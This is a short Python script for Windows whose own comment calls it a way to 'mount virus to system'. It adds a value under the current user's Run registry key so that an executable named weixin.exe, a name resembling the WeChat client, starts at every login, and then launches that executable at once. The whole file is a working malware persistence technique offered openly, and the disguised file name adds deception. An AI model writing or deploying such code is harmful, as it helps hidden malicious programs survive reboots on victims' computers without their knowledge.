# !/usr/bin/python
# -*- coding: UTF-8 -*-
# another way to mount virus to system,register on auto-start table

import os
import win32api
import win32con

name='wxwx'
path=pwd = os.getcwd()
path=path+u'\weixin.exe'
keyname='SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
try:
    key=win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,keyname,0,win32con.KEY_ALL_ACCESS)
    win32api.RegSetValueEx(key,name,0,win32con.REG_SZ,path)
    win32api.RegCloseKey(key)
    #start the program
    win32api.ShellExecute(0, 'open', path, '', '', 1)
    print '添加成功'
except:
    print '添加失败'
